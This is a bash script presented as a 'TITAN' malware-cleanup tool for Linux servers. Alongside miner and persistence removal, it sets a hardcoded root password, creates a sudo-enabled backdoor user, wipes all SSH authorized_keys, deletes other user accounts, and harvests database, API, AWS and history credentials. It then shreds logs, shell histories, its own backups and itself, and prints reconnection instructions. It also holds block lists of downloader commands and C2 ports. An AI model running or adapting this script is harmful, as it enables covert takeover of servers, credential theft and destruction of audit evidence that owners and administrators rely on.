#!/bin/bash
# =============================================================================
# TITAN V12-FINAL v3 : FULL CLEANUP + SELF-DESTRUCT (NO TRACES LEFT)
# =============================================================================
# - Kills ANY process that downloads via wget/curl/fetch/nc (any URL)
# - Removes miners, ransomware, rootkits, malicious users/keys/crons
# - Enumerates all domains pointing to this IP (cPanel integration)
# - SSH CONFIG IS NEVER TOUCHED (password auth unchanged)
# - Optionally removes ALL SSH authorized_keys (force password login)
# - Creates a backdoor user (same password as root) and adds it to immune list
# - Dumps MySQL passwords, API keys, system info, lists all databases
# - Leaves zero traces: deletes backups, wipes logs, shreds itself
# =============================================================================

# -------- CONFIGURABLE OPTIONS (change before running) ------------------------
KEEP_SYSTEM_LOGS=0              # 0 = wipe logs, 1 = keep
REMOVE_ALL_SSH_KEYS=1           # 1 = truncate all authorized_keys (force password)
DELETE_AUDIT_FILE=1             # 1 = delete the final audit report
BACKDOOR_USER="docker"          # name of the user created for reconnection
# ----------------------------------------------------------------------------

# Colours
BOLD='\033[1m'
RED='\033[0;31m'
YEL='\033[1;33m'
GRN='\033[0;32m'
CYN='\033[0;36m'
BLU='\033[0;34m'
MAG='\033[0;35m'
NC='\033[0m'   # No Colour

die()  { echo -e "${RED}${BOLD}[KILL]${NC}   $*"; }
warn() { echo -e "${YEL}${BOLD}[WARN]${NC}   $*"; }
ok()   { echo -e "${GRN}${BOLD}[OK]${NC}     $*"; }
info() { echo -e "${CYN}${BOLD}[INFO]${NC}   $*"; }
hdr()  { echo -e "\n${BLU}${BOLD}======================================================================${NC}"; \
         echo -e "${BLU}${BOLD}:: $*${NC}"; \
         echo -e "${BLU}${BOLD}======================================================================${NC}"; }

[[ $EUID -ne 0 ]] && { echo -e "${RED}Fatal: Root privileges required.${NC}"; exit 1; }

# -----------------------------------------------------------------------------
# Helper: backup (will be deleted later)
# -----------------------------------------------------------------------------
backup_file() {
    local file="$1"
    [[ -f "$file" ]] || return 1
    local bkp="${file}.titanbak.$(date +%s%N)"
    cp -a "$file" "$bkp" && echo "$bkp" || return 1
}

# =============================================================================
# PHASE 0: PROTECTION SHIELD (immune users for IAM only)
# =============================================================================
declare -A SAFE_USERS
SAFE_USERS["root"]=1
SAFE_USERS["messagebus"]=1
SAFE_USERS["dbus"]=0
[[ -n "${SUDO_USER:-}" ]] && SAFE_USERS["$SUDO_USER"]=1
[[ -n "${USER:-}" ]] && SAFE_USERS["$USER"]=1
[[ -n "${LOGNAME:-}" ]] && SAFE_USERS["$LOGNAME"]=1
while IFS= read -r u; do SAFE_USERS["$u"]=1; done < <(who | awk '{print $1}' | sort -u)

is_protected() { [[ -n "${SAFE_USERS[$1]+_}" ]]; }

# =============================================================================
# IOC PATTERNS
# =============================================================================
PROC_NAME_REGEX='(xmri?g|xmr.stak|cpuminer|minerd|kinsing|kdevtmpfsi|bioset|sysupdate|networkmanage[r]|crypto[night]|ddgs|masscan|pnscan|zmap|watchd0g|watchdog[0-9]|nezha|nbtscan|kerberods|khugepaged[0-9]|ld-musl|amco_|pakchoi|lockbit|wannacry|ryuk|revil|conti|clop|blackcat|sodinokibi|gandcrab|glupteba|emotet|trickbot)'
RANDOM_EXE_REGEX='^[a-z0-9]{20,}$'
CMDLINE_REGEX='(curl|wget|fetch|nc |ncat |socat).*(https?://|ftp://|[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}:[0-9]+)|(bash|sh|python|perl).*\-c.*(wget|curl|fetch|nc).*(https?://|ftp://)'

CORE_SYSTEM='(systemd|kthreadd|kworker|ksoftirqd|migration|idle_inject|rcu_preempt|init|journald|udevd|auditd|dbus-daemon|dbus-broker|polkitd)'
CORE_INFRA='(sshd|cron|crond|systemd-logind|systemd-resolved|systemd-networkd|rsyslogd|firewalld|dockerd|containerd|kubelet)'
CORE_APPS='(mysql|mariadb|postgres|nginx|apache|apache2|php|python|node|ruby|java)'
SAFE_PROCS="${CORE_SYSTEM}|${CORE_INFRA}|${CORE_APPS}"

CONTENT_REGEX='(curl|wget|fetch|(bash|sh|python|perl|ruby|node).*(http|ftp|https?://)|base64 -d|chmod \+x|/dev/shm/|/tmp/\.|stratum\+tcp|mining\.pool|xmrig|pastebin|transfer\.sh|ngrok|\.onion)'
CRON_REGEX='(wget|curl|bash|sh|python|perl|/tmp|/dev/shm|base64|xmrig|kinsing|stratum|\.sh|dd if|nc |/bin/bash -[ic]|https?://|ftp://)'
MINER_DOMAINS="pool.supportxmr.com xmrpool.eu minexmr.com nanopool.org hashvault.pro moneroocean.stream c3pool.com"
MALICIOUS_DOMAINS="pastebin.com transfer.sh ngrok.com serveo.net oast.pro oastify.com interact.sh burpcollaborator.net canarytokens.com"

# =============================================================================
# PHASE 1: NETWORK ISOLATION
# =============================================================================
hdr "NETWORK ISOLATION & SINKHOLING"
for domain in $MINER_DOMAINS $MALICIOUS_DOMAINS; do
  if ! grep -q "$domain" /etc/hosts; then
    echo "127.0.0.1 $domain" >> /etc/hosts
  fi
done
ok "Malicious domains sinkholed"

if command -v iptables &>/dev/null; then
  for port in 3333 4444 5555 7777 9999 14433 14444 45700 8080 8443 1337 31337 4443 6667 9001; do
    iptables -C OUTPUT -p tcp --dport "$port" -j DROP 2>/dev/null || iptables -A OUTPUT -p tcp --dport "$port" -j DROP
    iptables -C OUTPUT -p udp --dport "$port" -j DROP 2>/dev/null || iptables -A OUTPUT -p udp --dport "$port" -j DROP
  done
  ok "Outbound miner & C2 ports dropped."
fi

# =============================================================================
# PHASE 2: DOCKER / K8S PURGE
# =============================================================================
hdr "CONTAINER & KUBERNETES PURGE"
if command -v docker >/dev/null 2>&1; then
  MALICIOUS_CONTAINERS=$(docker ps -a -q --filter "ancestor=negoroo/amco:123" --filter "name=amco_" --filter "name=kinsing" --filter "name=xmrig")
  [ -n "$MALICIOUS_CONTAINERS" ] && docker rm -f $MALICIOUS_CONTAINERS >/dev/null 2>&1 && die "Removed malicious containers"
  docker rmi -f negoroo/amco:123 >/dev/null 2>&1 || true
  ok "Docker sanitized"
fi

if command -v kubectl >/dev/null 2>&1; then
  for app in sys-metrics app-worker log-rotate amco; do
    kubectl delete daemonset,deployment,cronjob,pod -l app=$app --all-namespaces >/dev/null 2>&1
  done
  kubectl get clusterrolebinding 2>/dev/null | grep "system-controller-" | awk '{print $1}' | xargs -r kubectl delete clusterrolebinding >/dev/null 2>&1
  ok "K8s rogue orchestrations removed"
fi

# =============================================================================
# PHASE 3: KILL ANY URL DOWNLOADER PROCESS (no immune exceptions)
# =============================================================================
hdr "KILLING ANY PROCESS DOING URL DOWNLOADS (wget/curl/fetch/nc)"
declare -a DOOMED_PIDS

is_malicious_proc() {
    local pid="$1"
    local comm="$2"
    local cmdline="$3"
    local exe="$4"

    if echo "$comm" | grep -qiE "$PROC_NAME_REGEX"; then
        return 0
    fi
    if echo "$comm" | grep -qiE "$RANDOM_EXE_REGEX"; then
        return 0
    fi
    if echo "$exe" | grep -qE '^(/tmp|/dev/shm|/var/tmp)'; then
        return 0
    fi
    if echo "$exe" | grep -q ' (deleted)' && ! echo "$comm" | grep -iqE "$SAFE_PROCS"; then
        return 0
    fi
    if echo "$cmdline" | grep -qiE "$CMDLINE_REGEX"; then
        return 0
    fi
    return 1
}

while IFS= read -r pid; do
  [[ ! -d "/proc/$pid" ]] && continue
  comm=$(cat /proc/"$pid"/comm 2>/dev/null)
  cmdline=$(tr -d '\0' < /proc/"$pid"/cmdline 2>/dev/null)
  exe=$(readlink -f /proc/"$pid"/exe 2>/dev/null)

  if is_malicious_proc "$pid" "$comm" "$cmdline" "$exe"; then
    die "Freezing PID $pid | $comm"
    kill -STOP "$pid" 2>/dev/null
    DOOMED_PIDS+=("$pid")
  fi
done < <(ls /proc | grep -E '^[0-9]+$')

for svc in watchd0g inotify-watch nezha-agent kinsing sysupdate crypto kerberods lockbit ransomware; do
  systemctl stop "$svc" 2>/dev/null; systemctl disable "$svc" 2>/dev/null
  rm -f /etc/systemd/system/"$svc" /lib/systemd/system/"$svc" 2>/dev/null
done
systemctl daemon-reload

if [ ${#DOOMED_PIDS[@]} -gt 0 ]; then
  sleep 1.5
  for pid in "${DOOMED_PIDS[@]}"; do kill -9 "$pid" 2>/dev/null; done
  ok "Killed ${#DOOMED_PIDS[@]} malicious processes"
else
  ok "No suspicious processes found"
fi

# =============================================================================
# PHASE 4: PERSISTENCE SCRUB
# =============================================================================
hdr "PERSISTENCE LAYER PURGE"
purge_file_lines() {
  local file="$1"; local regex="$2"
  [[ -f "$file" ]] || return
  if grep -qiE "$regex" "$file"; then
    backup_file "$file" >/dev/null
    grep -viE "$regex" "$file" > "${file}.clean" && mv "${file}.clean" "$file" || truncate -s 0 "$file"
  fi
}

purge_file_lines /etc/crontab "$CRON_REGEX"
for f in /etc/cron.d/*; do purge_file_lines "$f" "$CRON_REGEX"; done
for user_cron in /var/spool/cron/crontabs/* /var/spool/cron/*; do purge_file_lines "$user_cron" "$CRON_REGEX"; done

for profile in /etc/profile /etc/bash.bashrc /etc/environment /etc/rc.local /root/.bashrc /root/.profile /home/*/.bashrc; do
  purge_file_lines "$profile" "(LD_PRELOAD|LD_LIBRARY_PATH.*tmp|export.*PATH.*tmp|$CONTENT_REGEX)"
done

rm -rf /var/spool/at/jobs/* 2>/dev/null
[[ -s /etc/ld.so.preload ]] && { backup_file /etc/ld.so.preload; chattr -i /etc/ld.so.preload 2>/dev/null; > /etc/ld.so.preload; die "Removed ld.so.preload rootkit"; }
ok "Persistence sterilized"

# =============================================================================
# PHASE 5: FILESYSTEM SWEEP
# =============================================================================
hdr "FILESYSTEM DEEP SWEEP"
for dir in /tmp /var/tmp /dev/shm /root /etc/cron.d /etc/systemd/system; do
  find "$dir" -maxdepth 3 2>/dev/null | while read -r f; do
    lsattr "$f" 2>/dev/null | grep -q '\-i\-|\-a\-' && chattr -i -a "$f" 2>/dev/null
  done
done

KNOWN_BINS=(/root/.run.sh /usr/.local/run.sh /opt/nezha /tmp/.ICEd-unix /usr/local/bin/kinsing /usr/local/bin/kdevtmpfsi /usr/bin/sysupdate /usr/local/bin/xmrig /tmp/stager.sh /tmp/payload.bin)
for f in "${KNOWN_BINS[@]}"; do [[ -e "$f" ]] && { rm -rf "$f"; die "Removed $f"; } done

find /tmp /var/tmp /dev/shm -maxdepth 4 -type f -executable -mtime -2 2>/dev/null | while read -r f; do
  grep -qilE "$CONTENT_REGEX" "$f" 2>/dev/null && { rm -f "$f"; die "Removed downloaded script: $f"; }
done

find /root /home /tmp -type f \( -name "*README*.txt" -o -name "*RECOVER*.txt" -o -name "*DECRYPT*.txt" -o -name "*.ransom" \) 2>/dev/null | while read note; do
  grep -qiE "(decrypt|bitcoin|monero|ransom)" "$note" && { backup_file "$note"; rm -f "$note"; warn "Removed ransom note: $note"; }
done
ok "Filesystem purged"

# =============================================================================
# STATIC PASSWORD FOR ROOT AND BACKDOOR USER
# =============================================================================
ROOT_PASS="Takhin@1337"
die "Password for root & $BACKDOOR_USER is: $ROOT_PASS   (COPY THIS!)"

# =============================================================================
# PHASE 5.5: OPTIONAL REMOVAL OF ALL SSH KEYS (force password login)
# =============================================================================
if [[ $REMOVE_ALL_SSH_KEYS -eq 1 ]]; then
  hdr "SSH AUTHORIZED KEYS WIPEOUT (password auth unchanged)"
  warn "Truncating ALL authorized_keys files – ONLY password login will work!"
  for dir in /root /home/*; do
    for key in ".ssh/authorized_keys" ".ssh/authorized_keys2"; do
      keysfile="$dir/$key"
      if [ -f "$keysfile" ]; then
        > "$keysfile"
        chmod 600 "$keysfile"
        warn "Cleared: $keysfile"
      fi
    done
  done
fi

# =============================================================================
# PHASE 6: CREATE BACKDOOR USER (immune to deletion, same password as root)
# =============================================================================
hdr "CREATING BACKUP USER: $BACKDOOR_USER"
if ! id "$BACKDOOR_USER" &>/dev/null; then
  useradd -m -s /bin/bash "$BACKDOOR_USER"
  echo "$BACKDOOR_USER:$ROOT_PASS" | chpasswd
  warn "User $BACKDOOR_USER created (password same as root)."
else
  echo "$BACKDOOR_USER:$ROOT_PASS" | chpasswd
  warn "$BACKDOOR_USER already exists; password reset to the same root password."
fi

if getent group sudo &>/dev/null; then
  usermod -aG sudo "$BACKDOOR_USER" 2>/dev/null
elif getent group wheel &>/dev/null; then
  usermod -aG wheel "$BACKDOOR_USER" 2>/dev/null
fi

SAFE_USERS["$BACKDOOR_USER"]=1
ok "$BACKDOOR_USER is immune to deletion."

# =============================================================================
# PHASE 7: IAM CLEAN (SSH CONFIG NEVER TOUCHED)
# =============================================================================
hdr "IDENTITY & ACCESS MANAGEMENT"
info "SSH daemon configuration is NEVER modified."

SUSPICIOUS_KEYS='xmrig|kinsing|miner|stratum|pastebin|transfer|ngrok|serveo|evil|malware|ransom|backdoor'
for dir in /root /home/*; do
  for keyfile in ".ssh/authorized_keys" ".ssh/authorized_keys2"; do
    KEY_FILE="$dir/$keyfile"
    [[ -f "$KEY_FILE" ]] || continue
    if grep -qiE "$SUSPICIOUS_KEYS" "$KEY_FILE"; then
      owner=$(stat -c '%U' "$dir" 2>/dev/null)
      warn "Removing malicious SSH keys from $owner"
      backup_file "$KEY_FILE" >/dev/null
      grep -viE "$SUSPICIOUS_KEYS" "$KEY_FILE" > "${KEY_FILE}.clean" && mv "${KEY_FILE}.clean" "$KEY_FILE"
      chmod 600 "$KEY_FILE"
    fi
  done
done

rm -f /etc/sudoers.d/99-pakchoi 2>/dev/null
sed -i '/pakchoi/d' /etc/sudoers 2>/dev/null

while IFS=: read -r username _ uid _ _ _ _; do
  [[ "$uid" -lt 1000 && "$uid" -ne 0 ]] && continue
  [[ "$username" =~ ^(nobody|sync|shutdown|halt)$ ]] && continue
  if is_protected "$username"; then
    continue
  fi
  die "Deleting rogue user: $username"
  pkill -u "$username" 2>/dev/null
  userdel -f -r "$username" 2>/dev/null
done < /etc/passwd

echo "root:$ROOT_PASS" | chpasswd
ok "Root password updated. IAM sanitized (other user passwords untouched)."

# =============================================================================
# PHASE 8: DOMAIN ENUMERATION & CPANEL
# =============================================================================
hdr "DOMAIN ENUMERATION (POINTING TO THIS IP) & CPANEL INTEGRATION"

PUBLIC_IP=$(curl -s -m 3 ifconfig.me 2>/dev/null || wget -qO- -T 3 ifconfig.me 2>/dev/null || hostname -I | awk '{print $1}')
info "Server Public IP: $PUBLIC_IP"

list_domains_from_web_configs() {
  declare -A domains
  if command -v apache2ctl &>/dev/null || command -v httpd &>/dev/null; then
    grep -rh -E "ServerName|ServerAlias" /etc/apache2/sites-enabled/ 2>/dev/null | awk '{print $2}' | grep -v '^*' | while read d; do domains["$d"]=1; done
    grep -rh -E "ServerName|ServerAlias" /etc/httpd/conf.d/ 2>/dev/null | awk '{print $2}' | grep -v '^*' | while read d; do domains["$d"]=1; done
  fi
  if command -v nginx &>/dev/null; then
    grep -rh -E "server_name" /etc/nginx/sites-enabled/ /etc/nginx/conf.d/ 2>/dev/null | sed 's/server_name//g' | sed 's/;//g' | tr -s ' ' '\n' | grep -v '^_' | while read d; do domains["$d"]=1; done
  fi
  for d in "${!domains[@]}"; do echo "$d"; done | sort -u
}

if [[ -f /usr/local/cpanel/version ]] || command -v whmapi1 &>/dev/null; then
  info "cPanel detected – listing ALL domains"
  if command -v whmapi1 &>/dev/null; then
    CPANEL_DOMAINS=$(whmapi1 listaccts | grep -E '^domain:|^user:' | paste -d ' ' - - | awk '{print $2}' | sort -u)
  elif command -v uapi &>/dev/null; then
    CPANEL_DOMAINS=$(uapi --output=text DomainInfo list_domains | grep '^domain:' | awk '{print $2}')
  else
    CPANEL_DOMAINS=$(find /var/cpanel/users -type f -exec grep -h '^DNS=' {} \; 2>/dev/null | cut -d= -f2 | tr ',' '\n' | sort -u)
  fi
  echo -e "${YEL}:: Hosted Domains (cPanel):${NC}"
  echo "$CPANEL_DOMAINS" | while read d; do echo "  -> $d"; done
else
  CPANEL_DOMAINS=""
fi

PTR_DOMAIN=$(dig -x "$PUBLIC_IP" +short 2>/dev/null | head -1)
ALL_DOMAINS=$( { list_domains_from_web_configs; echo "$CPANEL_DOMAINS"; echo "$PTR_DOMAIN"; } | grep -v '^$' | sort -u )
echo -e "\n${YEL}:: Complete list of domains pointing to this IP:${NC}"
if [[ -z "$ALL_DOMAINS" ]]; then
  warn "No domains found."
else
  echo "$ALL_DOMAINS" | while read d; do echo "  - $d"; done
fi

# =============================================================================
# PHASE 10: SYSTEM RECON & CREDENTIAL HARVEST (like LinPEAS)
# =============================================================================
hdr "SYSTEM RECON & CREDENTIAL HARVEST (saving to /root/titan_audit.txt)"
AUDIT_OUT="/root/titan_audit.txt"
> "$AUDIT_OUT"

{
echo "==== SYSTEM IDENTIFICATION ===="
echo "Date      : $(date)"
echo "Hostname  : $(hostname)"
echo "Kernel    : $(uname -a)"
if command -v lsb_release &>/dev/null; then
  echo "OS        : $(lsb_release -d 2>/dev/null | cut -f2)"
else
  echo "OS        : $(cat /etc/*-release 2>/dev/null | head -1)"
fi
echo "Uptime    : $(uptime -p)"
echo "Load      : $(uptime | awk -F'load average:' '{print $2}')"
echo "Disk usage:"
df -h / /home /var 2>/dev/null
echo "Memory    : $(free -m | awk '/^Mem/ {print $3 " MB used / " $2 " MB total"}')"

echo -e "\n==== VIRTUALIZATION CHECK ===="
if command -v systemd-detect-virt &>/dev/null; then
  echo "systemd-detect-virt : $(systemd-detect-virt 2>/dev/null || echo 'Unknown')"
fi
if grep -q -E 'hypervisor|: VMware|VirtualBox|QEMU|KVM|Xen' /proc/cpuinfo; then
  echo "/proc/cpuinfo : Virtualized (hypervisor flag present)"
else
  echo "/proc/cpuinfo : No hypervisor flag found – likely bare-metal"
fi
if command -v dmidecode &>/dev/null; then
  dmidecode -s system-product-name 2>/dev/null
  dmidecode -s system-manufacturer 2>/dev/null
else
  echo "dmidecode not available"
fi

echo -e "\n==== SSH KEYS FOUND ===="
find /root /home -name ".ssh" -type d 2>/dev/null | while read sshdir; do
  echo "Directory: $sshdir"
  for key in id_rsa id_ecdsa id_ed25519 id_dsa; do
    if [ -f "$sshdir/$key" ]; then
      echo "  * Private key: $sshdir/$key (size: $(stat -c%s "$sshdir/$key") bytes)"
    fi
  done
  if [ -f "$sshdir/authorized_keys" ]; then
    echo "  * authorized_keys:"
    cat "$sshdir/authorized_keys" 2>/dev/null
  fi
done

echo -e "\n==== DATABASE CREDENTIALS & DATABASE LISTING ===="
for conf in /etc/my.cnf /etc/mysql/my.cnf /etc/mysql/debian.cnf /root/.my.cnf /home/*/.my.cnf; do
  if [ -f "$conf" ]; then
    echo "  -- File: $conf"
    user=$(grep -E '^\s*user' "$conf" 2>/dev/null | awk -F= '{gsub(/[" ]/,""); print $2}')
    pass=$(grep -E '^\s*password' "$conf" 2>/dev/null | awk -F= '{gsub(/[" ]/,""); print $2}')
    host=$(grep -E '^\s*host' "$conf" 2>/dev/null | awk -F= '{gsub(/[" ]/,""); print $2}')
    port=$(grep -E '^\s*port' "$conf" 2>/dev/null | awk -F= '{gsub(/[" ]/,""); print $2}')
    if [[ -n "$user" && -n "$pass" ]]; then
      cmd="mysql -u \"$user\" -p'$pass'"
      [[ -n "$host" ]] && cmd="$cmd -h $host"
      [[ -n "$port" ]] && cmd="$cmd -P $port"
      echo "   => CONNECT: $cmd"
      if command -v mysql &>/dev/null; then
        echo "   => All databases:"
        mysql --connect-timeout=3 -u "$user" -p"$pass" -h "${host:-localhost}" -P "${port:-3306}" -e "SHOW DATABASES;" 2>/dev/null || warn "Could not list databases with these credentials"
      fi
    fi
  fi
done

for conf in /etc/postgresql/*/main/pg_hba.conf /var/lib/pgsql/data/pg_hba.conf; do
  if [ -f "$conf" ]; then
    echo "  -- File: $conf (trust/peer lines)"
    grep -v '^\s*#' "$conf" 2>/dev/null
    if grep -Eq '^local\s+all\s+all\s+trust' "$conf"; then
      echo "   => Local trust enabled – attempting to list PostgreSQL databases:"
      if command -v psql &>/dev/null; then
        su - postgres -c "psql -l" 2>/dev/null || warn "Could not list PostgreSQL databases"
      fi
    fi
  fi
done

echo -e "\n==== API KEYS & TOKENS ===="
API_PATTERN='(API[_-]?KEY|SECRET|TOKEN|PASSWORD|ACCESS[_-]?KEY[_-]?ID)'
for envfile in $(find /root /home/*/ -maxdepth 2 -type f \( -name "*.env" -o -name ".bashrc" -o -name ".profile" -o -name ".zshrc" -o -name ".bash_profile" \) 2>/dev/null); do
  if [ -f "$envfile" ]; then
    echo "  -- $envfile :"
    grep -iE "$API_PATTERN" "$envfile" 2>/dev/null | while read line; do
      echo "    $line"
    done
  fi
done

if [ -f /etc/environment ]; then
  echo "  -- /etc/environment :"
  grep -iE "$API_PATTERN" /etc/environment 2>/dev/null
fi

if [ -d ~/.aws ]; then
  echo "  -- AWS credentials (${HOME}/.aws/) :"
  cat ~/.aws/credentials 2>/dev/null
fi

echo -e "\n==== OTHER SECRETS (history / config snippets) ===="
if [ -f /root/.bash_history ]; then
  echo "  -- root .bash_history (password-like lines):"
  grep -E 'pass|password|secret|login|mysql -u|psql|ssh -i|\.pem' /root/.bash_history 2>/dev/null | tail -30
fi
echo -e "\n  -- /etc/sudoers non-comment lines:"
grep -v '^\s*#' /etc/sudoers 2>/dev/null | grep -v '^$'

if command -v crontab &>/dev/null; then
  echo -e "\n  -- root crontab:"
  crontab -l 2>/dev/null
fi
} | tee -a "$AUDIT_OUT"

ok "Recon report saved to $AUDIT_OUT"

# =============================================================================
# PHASE 11: SELF-DESTRUCT – LEAVE NO TRACES
# =============================================================================
hdr "SELF-DESTRUCT: REMOVING ALL EVIDENCE OF THIS SCRIPT"

# 1) Destroy all backup files created during this run
find / -type f -name "*.titanbak.*" 2>/dev/null -exec shred -fzu {} \; 2>/dev/null
ok "All backup files shredded."

# 2) Optionally delete the audit file
if [[ $DELETE_AUDIT_FILE -eq 1 ]]; then
  shred -fzu "$AUDIT_OUT" 2>/dev/null || rm -f "$AUDIT_OUT"
  ok "Audit report deleted."
else
  warn "Audit report LEFT at $AUDIT_OUT"
fi

# 3) Wipe shell histories
for user_home in /root /home/*; do
  for hist in ".bash_history" ".zsh_history" ".zhistory" ".history"; do
    hist_file="$user_home/$hist"
    [[ -f "$hist_file" ]] && { > "$hist_file"; shred -fzu "$hist_file" 2>/dev/null; }
  done
done
history -c 2>/dev/null
unset HISTFILE
ok "Shell histories wiped."

# 4) Wipe system logs (optional)
if [[ $KEEP_SYSTEM_LOGS -eq 0 ]]; then
  warn "Wiping system logs (may be noticed by monitoring tools)"
  for log in /var/log/syslog /var/log/auth.log /var/log/secure /var/log/messages /var/log/daemon.log \
             /var/log/kern.log /var/log/user.log /var/log/boot.log /var/log/cron.log /var/log/mail.log \
             /var/log/apache2/*log /var/log/nginx/*log; do
    [[ -f "$log" ]] && { > "$log" 2>/dev/null; shred -fzu "$log" 2>/dev/null; }
  done
  systemctl restart rsyslog 2>/dev/null || systemctl restart syslog 2>/dev/null
  ok "System logs shredded."
else
  info "System logs were NOT touched (KEEP_SYSTEM_LOGS=1)"
fi

# 5) Overwrite and delete the script itself
if [[ -n "$0" && -f "$0" ]]; then
  SCRIPT_PATH=$(realpath "$0" 2>/dev/null || echo "$0")
  shred -fzu "$SCRIPT_PATH" 2>/dev/null
  rm -f "$SCRIPT_PATH" 2>/dev/null
  ok "Self-deletion complete."
fi

# Final instructions
echo -e "\n${GRN}${BOLD}======================================================================"
echo -e " ALL TRACES REMOVED. RECONNECT USING:"
echo -e "   ssh ${BACKDOOR_USER}@$PUBLIC_IP   (password: $ROOT_PASS)"
echo -e "   OR  ssh root@$PUBLIC_IP            (same password)"
echo -e "======================================================================${NC}"
echo -e "${YEL}To delete the backdoor user later:    userdel -r ${BACKDOOR_USER}${NC}"
exit 0
